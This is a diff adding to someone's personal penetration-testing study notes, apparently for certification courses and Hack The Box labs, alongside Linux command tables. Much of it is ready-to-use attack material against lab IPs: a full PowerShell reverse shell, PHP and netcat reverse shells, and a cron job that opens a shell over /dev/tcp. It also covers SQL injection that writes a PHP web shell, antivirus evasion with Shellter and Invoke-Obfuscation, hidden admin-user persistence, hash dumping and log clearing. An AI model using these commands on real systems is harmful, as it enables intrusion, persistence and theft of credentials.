+    nmap -sV -p21 --script=ftp-anon 10.0.28.97
+    //If we need valid credentials, we could use hydra with different lists users/passwords or users/users
+    ftp 10.0.28.97 21
+    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
+  Targeting SMB
+    enum4linux -u vagrant -p vagrant 10.10.16.3 //Enumerate other user accounts
+    python3 psexec.py administrator@10.10.16.3
+  Targeting mysql
+    //Once we are in, we could change several things
+      UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; //For example
+    Change the content in phpmyadmin.conf to Allow from all
+    //Once you have done changes regarding with Apache you have to restart this service. This can be done with
+      net stop wampapache
+      net start wampapache
+
+Linux exploitation
+  Brute force with SMTP to a vulnerable vsftpd 
+    msfconsole -q
+      search smtp_enum
+    //Once you have some users
+    hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp 
+    //UPload a reverse shell 
+    ls -al /usr/share/webshells/php-reverse-shell.php
+    cp /usr/share/webshells/php-reverse-shell.php . //Change $ip and $port
+    ftp 10.2.17.5 21
+    cd /var/www/
+    cd dav
+    put shell.php //and nc -nvlp 1234 in our machine
+  
+  Targeting PHP
+    10.2.19.172/phpinfo.php //Know some useful info with its version
+    searchsploit php cgi //Lower than 5.3.12
+    //We could use exploit/multi/http/php_cgi_arg_injection
+    //If we try to modify 18836.py we could use this one liner to obtain a reverse shell
+      $sock=fsockopen("IP",1234);exec("/bin/sh -i <&4 >&4 2>&4");
+
+  Targeting Samba
+   msfconsole -q
+    search smb_version //It is valid for samba and smb
+    use auxiliary/scanner/smb/smb_version  
+AV evasion with Shelter
+  Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
+    - Uninstalling/disabling security software 
+    - Obfuscating/encrypting data and scripts
+    - Leverage and abuse trusted processes to hide and masquerade their malware
+  //We are going to try to change the signature of the malicious executable that we are generating
+  AV detection methods
+    1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
+      We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
+    2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
+    3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
+  AV evasion techniques
+    On-disk evasion techniques
+      1.  Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
+      2.  Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
+      3.  Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
+      4.  Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
+    In-Memory evasion techniques
+      1.  Focuses on manipulation of memory and does not write files to disk
+      2.  Injects payload into a process by leveraging various Windows APIs
+      3.  Payload is then executed in memory in a separate thread
+  Usage of shellter
+    https://www.shellterproject.com/introducing-shellter/
+    apt-get install shellter -y
+    //We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
+    dpkg --add-architecture i386
+    apt-get install wine32
+    //We could use the vncviewer.exe 
+    cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
+    cd /usr/share/windows-resources/shellter
+    sudo wine shellter.exe
+      Auto mode
+      /home/kali/Desktop/AVBypass/vncviewer.exe
+      //Shellter will trace a random number of instructions 
+      Enable Stealth Mode? Yes //If you want that executable work as intended.
+      Payload? Listed payload 
+      set lhost
+      set lport
+      msfconsole -q
+        use multi/handler
+        set payload windows/meterpreter/reverse_tcp
+      python3 -m http.server 80
+        //Execute it in the Windows machine 
+  Obfuscating Powershell code
+    git clone https://github.com/danielbohannon/Invoke-Obfuscation
+    Use a reverse shell in powershell and save it as shell.ps1
+      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    apt-get install powershell -y
+    pwsh
+      cd ./Invoke-Obfuscation
+      Import-Module ./Invoke-Obfuscation.ps1
+      cd ..
+      Invoke-Obfuscation
+        SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
+
+Host & Network Penetration Testing: Post-Exploitation
+  Methodology
+    1. Local Enumeration
+        Enumerating System information
+        Enumerating Users & Groups
+        Enumerating Network Information
+        Enumerating Services
+        Automating Local Enumeration
+    2. Transferring files
+        Setting up a web server with Python
+        Transferring files to windows targets
+        Transferring files to linux targets
+    3. Upgrading shells
+        Upgrading command shells to meterpreter
+        Spawning tty shells
+    4. Privilege escalation
+        Identifying PrivEsc Vulns
+        Windows PrivEsc
+        Linux PrivEsc
+    5. Persistence
+        Setting Up Persistence On Windows
+        Setting Up Persistence On Linux
+    6. Dumping & Cracking hashes
+        Dumping & Cracking Windows Hashes
+        Dumping & Cracking Linux Hashes
+    7. Pivoting
+        Internal Network Recon
+        Pivoting
+    8. Clearing tracks
+        Clearing your tracks on Windows & Linux
+
+  Windows Enumeration
+    Windows Local Enumeration
+      Enumerating System information
+        We are looking for:
+          - Hostname
+          - OS Name(Windows 7,8,etc)
+          - OS Build & Service Pack (Windows 7 SP1 7600)
+          - OS Architecture (x64/x86)
+          - Installed updates/Hotfixes
+        meterpreter >
+          getuid //Current user
+          sysinfo
+        shell >
+          hostname
+          systeminfo
+          wmic qfe get Caption,Description,HotFixID,InstalledOn //Security Update
+          cat C:\Windows\System32\eula.txt
+
+      Enumerating Users & Groups
+        We are looking for:
+          - Current user & privileges
+          - Additional user information
+          - Other users on the system
+          - Groups
+          - Members of the built-in administrator group
+        //The windows Administrator account is disabled by default unless it is explicitly enabled.
+        meterpreter >
+          getuid
+          getprivs
+          search logged_on //Enumerate current and recently logged users
+        shell >
+          whoami
+          whoami /priv
+          query user //Seet what users are logged on in addition to you
+          net users
+          net user administrator //Know more about a user
+          net localgroup
+          net localgroup administrators //Know the members of this group
+      Enumerating Network Information
+        We are looking for:
+          - Current IP address & network adapter
+          - Internal networks
+          - TCP/UDP services running and their respective ports
+          - Other hosts on the network
+          - Routing table
+          - Windows Firewall state
+        shell > 
+          ipconfig /all
+          route print
+          arp -a
+          netstat -ano
+          netsh firewall show state or netsh advfirewall firewall 
+          netsh advfirewall show allprofiles
+      Enumerating Processes & Services
+        We are looking for:
+          - Running processes & services
+          - Scheduled tasks
+        > A process is an instance of a running executable(.exe) or program
+        > A service is a process which runs in the background and does not interact with the desktop
+        meterpreter >
+          ps 
+          pgrep explorer.exe
+          migrate 2176 //You can only migrate to a different process if you have an elevated session on the target system
+        shell >
+          net start //Services running in the background
+          wmic service list brief
+          tasklist /svc //List services running under that particular process
+          schtasks /query /fo list /v
+      
+      Automating Windows Local Enumeration
+        https://github.com/411Hall/JAWS //It should run on every Windows version since Windows 7
+        meterpreter > 
+          show_mount
+        search win_privs
+        search enum_logged_on_users 
+        search checkvm
+        search enum_applications //Applications installed
+        search enum_computers //Is the host part of a domain
+        search enum_patches //Patches installed
+        search enum_shares
+        powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+    Linux Local enumeration
+      Enumerating system information
+        We are looking for: 
+          - Hostname
+          - Distribution & distribution release version
+          - Kernel version & architecture
+          - CPU information
+          - Disk information & mounted drives
+          - Installed packages/software
+        bash > 
+          hostname
+          cat /etc/issue
+          cat /etc/*release
+          uname -a
+          env //Enviromental variables
+          lscpu
+          free -h //Hos many RAM is consumed
+          df -h
+          df -ht ext4 
+          lsblk | grep sd //Storage devices
+          dpkg -l
+    Enumerating users & groups
+      groups
+      groups bob
+      cat /etc/passwd 
+      useradd -m bob -s /bin/bash 
+      usermod -aG root bob //To which group and who user?
+      w or who 
+      last //by ssh or console
+      lastlog  //List of users of have recently logged in to the system
+    Enumerating Network Information
+      We are looking for:   
+        - Current IP address & network adapter
+        - Internal networks
+        - TCP/UDP services running and their respective ports
+        - Other hosts on the network
+      meterpreter >
+        ifconfig
+        netstat 
+        route
+        arp
+      shell > 
+        ip a 
+        cat /etc/networks //List of interfaces 
+        cat /etc/hostname
+        cat /etc/hosts
+        cat /etc/resolv.conf //DNS server by default
+        arp -a
+    Enumerating processes & cron jobs
+      We are looking for:
+        - Running services
+        - Cron jobs
+      msfconsole >
+        ps
+      shell >
+        ps
+        ps aux
+        top
+        crontab -l
+        ls -la /etc/cron* //Display all cron jobs
+    Automating Linux Local Enumeration
+      search enum_configs
+      search enum_network
+      search enum_system
+      search checkvm
+      https://github.com/rebootuser/LinEnum
+
+Transferring files to Windows & Linux targets
+  Setting up a web server with Python
+    Python2 ==> SimpleHTTPServer
+    Python3 ==> http.server
+  Transferring files to windows targets
+    certutil -urlcache -f http://10.10.4.2/mimikatz.exe mimikatz.exe
+  Transferring files to Linux targets
+    cd /tmp
+    cd /usr/share/webshells/php/
+    python3 -m http.server 80
+    wget http://10.10.3.4/php-backdoor.php
+
+Shells
+  Upgrading non-interactive shells (Linux post exploitation)
+    //Which shells the system has?
+      cat /etc/shells
+    Is python installed?
+      python --version
+      python -c 'import pty; pty.spawn("/bin/bash")'
+    Is perl installed?
+      perl -e 'exec "/bin/bash";'
+      perl: exec "/bin/bash";
+    Is ruby installed?
+      ruby: exec "/bin/bash"
+  Now, check the environmental variables
+    env
+    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    export TERM=xterm
+    export SHELL=bash
+
+Escalation
+  Windows privilege escalation
+    Identifying windows privilege escalation vulnerabilities
+      https://github.com/itm4n/PrivescCheck
+      use exploit/multi/script/web_delivery
+        set target PSH\ (Binary)
+        set payload windows/shell/reverse_tcp
+        set PSH-EncodedCommand false
+      //Upgrade normal shell to meterpreter
+        set WIN_TRANSFER VBS
+      //Once we have access we can use PrivescCheck
+          powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+          runas.exe /user:administrator cmd
+      //In our machine
+        //This module hosts an HTML Application (HTA) that when opened will run a payload via
+Powershell
+        use exploit/windows/misc/hta_server
+      //In victim
+        mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
+
+    Windows Privilege escalation
+      //Supose that we have obtained valid credentials. After obtaining user account credentials, what protocols can we use to authenticate with the Windows target 
+      //Without Metasploit
+        psexec.py administrator@10.10.5.10 
+      //With Metasploit
+        use exploit/windows/smb/psexec
+          set smbuser 
+          set smbpass
+            
+Linux Privilege Escalation
+  Weak Permissions
+    cat /etc/passwd
+    cat /etc/groups 
+    groups student
+    find / -not -type l -perm -o+w
+    // /etc/shadow is writable
+      openssl passwd -1 -salt abc password //-1 is the lower level of hash
+      vim /etc/shadow
+  SUDO privileges
+    sudo -l
+        
+Persistence
+    Windows Persistence
+        Persistence Via Services
+            msfconsole -q 
+                ps -S explorer.exe
+                migrate 3124
+                search persistence_service
+                use multi/handler
+                    set payload windows/meterpreter/reverse_tcp
+        Persistence via RDP
+            meterpreter >
+                run getgui -e -u m1l0js -p m1l0js_123321
+                //getgui command makes the below changes to the target machine
+                ● Enable RDP service if it’s disabled
+                ● Creates new user for an attacker
+                ● Hide user from Windows Login screen
+                ● Adding created user to "Remote Desktop Users" and "Administrators" groups
+            //Now we can access via RDP
+            xfreerdp /u:m1l0js /p:m1l0js_123321 /v:10.2.18.93
+            //Think as a red teamer and create a user like guest instead of the normal Guest
+
+    Linux persistence
+        Persistence via SSH Keys
+            //In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password
+            // After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access
+            scp student@192.63.238.3:~/.ssh/id_rsa .
+            chmod 400 id_rsa
+            ssh -i id_rsa student@192.63.238.3
+          Create a ssh key pair
+            ssh-keygen -v 4096
+            //Pass your id_rsa.pub
+              ssh-copy-id root@10.10.13.4
+            //At this moment, authorized keys exists
+        Persistence via Cron Jobs
+          Cron jobs = schedule tasks(Windows)
+          * * * * * command to execute
+          min(0-59)
+          hour(0-23)
+          day of month(1-31)
+          month(1-12)
+          day of week(0-7)
+          //Example
+            echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'" > cron
+            crontab -l  //List cron jobs
+            crontab -i cron //Include our cron job
+          //Other example
+            echo " * * * * * cd /home/student/ && python3 -m http.server 8000" > cron
+            crontab -i cron
+            crontab -l
+
+Dumping & Cracking 
+  Dumping & cracking NTLM hashes(Windows)
+    meterpreter >
+      pgrep lsass 
+      migrate 708
+      hashdump //List NTLM hashes
+    //Crack it with meterpreter
+      use auxiliary/analyze/crack_windows
+    //Crack it with John
+      john --list=formats
+      john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    //Crack it with hashcat
+      hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+    
+  Dumping & cracking Linux password hashes
+    use exploit/unix/ftp/proftpd_133c_backdoor
+    use post/linux/gather/hashdump
+    //Crack it with john
+      john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+      john --show
+    //Crack it with hashcat
+      hashcat --help | grep 1800
+      hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
+
+Pivoting
+  meterpreter > 
+    run autoroute -s 10.0.29.0/20 
+    run autoroute -p //List active routing table
+  use auxiliary/scanner/portscan/tcp
+  meterpreter >
+    portfwd add -l 1234 -p 80 -r 10.0.29.96
+  use badblue_passthru 
+    set payload windows/meterpreter/bind_tcp
+
+
+Clearing your tracks
+  Windows
+    use exploit/windows/local/persistence_service 
+      resource ....rc //It will clear the traces and the .exe generated with this module
+    meterpreter > 
+      clearev
+
+  Linux
+    history -c 
+    cat /dev/null  > bash_history
+
+Social Engineering 
+  GoPhish
+    1. New sending profile
+      from: info <support@demo.ine.local>
+      Host: localhost:25 //Where de stmp server is
+      Username: red@demo.ine.local
+    2. New landing page
+      + Capture submitted data
+      Redirect to: http://localhost:8080
+    3. Email Templates
+      Import email
+    4. Users & Groups
+      Import csv 
+    5. Campaigns
+      URL: http://localhost //It could be a cloud server
+
+  
+Web Application penetration testing: Introduction to the Web ahd HTTP protocol
+  Intro to web
+    //How to upload and delete files?
+      curl 192.36.17.3/uploads/ --upload-file hello.txt
+      curl -X DELETE 192.36.17.3/uploads/hello.txt
+  Gobuster
+    gobuster dir -u http://192.19.3.2 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+  Nikto
+    nikto -h http://192.158.187.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V -o nikto.html -Format htm
+  Passive crawler with BurpSuite
+    Dashboard > Capturing 
+  If with BurpSuite we have a header Authorization: Basic ==> We can base64-decode ==> Add Prefix to admin: ==> Add another payload processing to encode the payload to base64
+
+-=-=-==============-----------------------------------------============
+eWPT(Notes)
+The Rules of Engagement
+  Why do you want to execute a penetration tester?
+  When creating a timetable, it should contain at least the following information:
+    - Target(s)
+    - Start (format: Date-time)
+    - End   (format: Date-time)
+    - Criticality of test(format: text) //Medium, High, Low
+    - Step in process(format: text) //Scanning, OS detection, exploitation, etc
+    - Source IP address
+A non-disclosure agreement
+An emergency plan involves:
+  - The timetable
+  - The contact in charge of responding to the emergency plan
+  - The solutions to apply to the issue
+Methodologies
+  http://www.pentest-standard.org/index.php/Main_Page
+  https://owasp.org/www-project-web-security-testing-guide/
+The reporting phase
+  Freemind(http://freemind.sourceforge.net/wiki/index.php/Download) //Mind mapping
+  Your penetration test report's target audience groups are:
+    - Executive: You have to speak in terms of metrics, risk mitigation and money loss
+    - IT Department: Which areas or departments are more affected and to what kind of vulnerabilities
+    - Development: Your exploits, your POCs, remediation tips, source code, etc
+  A typical structure
+    Executive summary(2-3 pages)
+      //"The purpose of this assessment and report is to identify any web application issues that could affect ABC, Inc and the web server hosting it and to provide solutions to remedy these same issues. "
+    Vulnerability report => Remediation report
+
+
+
+
+
+
+    
+How to pase into web page fields that prevent copy and paste?
+document.getElementById("paste-no").onpaste={};
+document.getElementById("paste-no").onpaste=null;
+    
+
+  
+Academy_HTB
+Linux fundamentals
+Linux fundamentals(https://www.pathname.com/fhs/pub/fhs-2.3.pdf)
+| *Command* | *Description* |
+| --------------|-------------------|
+| `man <tool>` | Opens man pages for the specified tool. | 
+| `<tool> -h` | Prints the help page of the tool. | 
+| `apropos <keyword>` | Searches through man pages' descriptions for instances of a given keyword. | 
+| `cat` | Concatenate and print files. |
+| `whoami` | Displays current username. | 
+| `id` | Returns users identity. | 
+    The adm group means that the user can read log files in /var/log
+| `hostname` | Sets or prints the name of the current host system. | 
+| `uname` | Prints operating system name. | 
+    uname -p //Processor type
+    uname -i //Hardware plaftorm
+| `pwd` | Returns working directory name. | 
+| `ifconfig` | The `ifconfig` utility is used to assign or view an address to a network interface and/or configure network interface parameters. | 
+| `ip` | Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. | 
+| `netstat` | Shows network status. | 
+| `ss` | Another utility to investigate sockets. | 
+| `ps` | Shows process status. | 
+| `who` | Displays who is logged in. | 
+| `env` | Prints environment or sets and executes a command. | 
+| `lsblk` | Lists block devices. | 
+| `lsusb` | Lists USB devices. | 
+| `lsof` | Lists opened files. | 
+| `lspci` | Lists PCI devices. | 
+| `sudo` | Execute command as a different user. | 
+| `su` | The `su` utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed. | 
+  su -c, --command //Execute a command as a different user 
+| `useradd` | Creates a new user or update default new user information. | 
+| `userdel` | Deletes a user account and related files. |
+| `usermod` | Modifies a user account. | 
+  usermod -L, --lock //If you wish to lock the account (not only access with a password), you should also set the EXPIRE_DATE to 1
+| `addgroup` | Adds a group to the system. | 
+| `delgroup` | Removes a group from the system. | 
+| `passwd` | Changes user password. |
+| `dpkg` | Install, remove and configure Debian-based packages. | 
+| `apt` | High-level package management command-line utility. | 
+| `aptitude` | Alternative to `apt`. | 
+| `snap` | Install, remove and configure snap packages. Snaps enable the secure distribution of the latest apps and utilities for the cloud, servers, desktops, and the internet of things. |
+| `gem` | Standard package manager for Ruby. | 
+| `pip` | Standard package manager for Python. | 
+| `git` | Revision control system command-line utility. | 
+| `systemctl` | Command-line based service and systemd control manager. |
+| `ps` | Prints a snapshot of the current processes. | 
+| `journalctl` | Query the systemd journal. | 
+| `kill` | Sends a signal to a process. | 
+| `bg` | Puts a process into background. |
+| `jobs` | Lists all processes that are running in the background. | 
+| `fg` | Puts a process into the foreground. | 
+| `curl` | Command-line utility to transfer data from or to a server. | 
+| `wget` | An alternative to `curl` that downloads files from FTP or HTTP(s) server. |
+| `python3 -m http.server` | Starts a Python3 web server on TCP port 8000. | 
+| `ls` | Lists directory contents. | 
+| `cd` | Changes the directory. |
+| `clear` | Clears the terminal. | 
+| `touch` | Creates an empty file. |
+| `mkdir` | Creates a directory. | 
+| `tree` | Lists the contents of a directory recursively. |
+| `mv` | Move or rename files or directories. | 
+| `cp` | Copy files or directories. |
+| `nano` | Terminal based text editor. | 
+| `which` | Returns the path to a file or link. |
+| `find` | Searches for files in a directory hierarchy. | 
+| `updatedb` | Updates the locale database for existing contents on the system. |
+| `locate` | Uses the locale database to find contents on the system. | 
+| `more` | Pager that is used to read STDOUT or files. |
+| `less` | An alternative to `more` with more features. | 
+| `head` | Prints the first ten lines of STDOUT or a file. |
+| `tail` | Prints the last ten lines of STDOUT or a file. | 
+| `sort` | Sorts the contents of STDOUT or a file. |
+| `grep` | Searches for specific results that contain given patterns. | 
+| `cut` | Removes sections from each line of files. |
+| `tr` | Replaces certain characters. | 
+| `column` | Command-line based utility that formats its input into multiple columns. |
+| `awk` | Pattern scanning and processing language. |
+| `sed` | A stream editor for filtering and transforming text. | 
+| `wc` | Prints newline, word, and byte counts for a given input. |
+| `chmod` | Changes permission of a file or directory. |
+| `chown` | Changes the owner and group of a file or directory. |
+
+Path	Description
+/	    The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
+/bin	Contains essential command binaries.
+/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
+/dev	Contains device files to facilitate access to every hardware device attached to the system.
+/etc	Local system configuration files. Configuration files for installed applications may be saved here as well.
+/home	Each user on the system has a subdirectory here for storage.
+/lib	Shared library files that are required for system boot.
+/media	External removable media devices such as USB drives are mounted here.
+/mnt	Temporary mount point for regular filesystems.
+/opt	Optional files such as third-party tools can be saved here.
+/root	The home directory for the root user.
+/sbin	This directory contains executables used for system administration (binary system files).
+/tmp	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
+/usr	Contains executables, libraries, man files, etc.
+/var	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.
+
+
+Useful links
+https://bashrcgenerator.com/
+https://github.com/powerline/powerline
+https://explainshell.com/
+
+        
+
+      
+
+
+      
+        
+          
+
+      
+
+
+
+
+
+        
+
+
+      
+        
     
 
 
 
 
 
+      
+      
+      
+      
+
+
+      
+
+
+
+
+
+
+      
+        
+
+        
+
+
+      
+          
+
+      
+      
+
+
+             
+              
+
+            
+
+
+            
+        
+            
+        
+
+
+
+
+          
+        
+
+
+
+      
+      
+          
+      
+      
+
+
+
+          
+      
+
+
+-=-=-
+Portswigger
+1.SQLi
+show databases;
+create database Twitch;
+MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
+MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';
+
+
+
+-==-=-=-=-=-=-=-=-=-=
+-==-=-=-=-=-=-=-=-=-=
+-==-=-=-=-=-=-=-=-=-=
+-==-=-=-=-=-=-=-=-=-=
+-==-=-=-=-=-=-=-=-=-=
+-==-=-=-=-=-=-=-=-=-=
+
+JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>
+
+#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 
+
+###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
+Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in       
+        
+            
+        
+
+
+
+
+          
+        
+
+
+
+      
+      
+          
+      
+      
+
+
+
+          
+      
+
+
+-=-=-
+Portswigger
+1.SQLi
+show databases;
+create database Twitch;
+MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
+MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';
 
 
 
@@ -899,10 +3028,20 @@ JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- 
 ###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
 Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 
 
-database() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name
+database(), version() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name
 
-
-
+-=-=-=-=-=-=-=-=
+Validation machine ==> 
+<h1>Hola</h1> (HTML injection vulnerable) //<script>alert("XSS")</script> (XSS vulnerable) ==> Let's how one of the parameters are send with burpsuite ==> burpsuite &> /dev/null & ==> SQLi ==> In the POST request username=suspicious&country=Brazil' union select version()-- - ==> username=suspicious&country=Brazil' union select "test"-- - //Test appears on the screen ==> username=suspicious&country=Brazil' union select schema_name from information_schema.schemata-- - ==> username=suspicious&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- - ==>
+username=suspicious&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- - ==> username=suspicious&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- - //It does not work, let's try with into outfile ==> username=suspicious&country=Brazil' union select "loquesea" into outfile "/var/www/html/dog.txt"-- - ==>
+username=baduser&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/test.php"-- -
+//validation.py 
+  pdb.set_trace()
+    l
+    p filename
+    p main_url
+//Another SQLi ==> static php cookie ==> ❯ echo -n 'm1l0js' | md5sum f49775f4b37981eb269a05abccba27cf ==> Use it in storage(developer tools)
+//Use burpsuite in cmd parameter and urlencode the data
 
 
 
@@ -1467,6 +3606,9 @@ Consider the following concrete examples:
     hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
     hydra -l <username> -P <wordlist> 10.10.22.33 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
     hydra -t 4 -I -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.22.33 http-post-form "/login/:username=molly&password=^PASS^:Your username or password is incorrect."
+    hydra -L usernames -P passwords 192.208.137.3 http-post-form
+"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
+credentials or user not activated!"
 
 There are some extra optional arguments that you can add:
 
@@ -5173,6 +7315,14 @@ Notice that even blank lines must contain the caret character. This ensures that
 [+] More tutorials ==> https://www.markdowntutorial.com/conclusion/
 -=-=-=-=
 Rust
+
+Installing rustup 
+$ curl --proto '=https' --tlsv1.3 https://sh.rustup.rs -sSf | sh
+
+
+
+
+
 
 cargo new hello_cargo
 cargo build
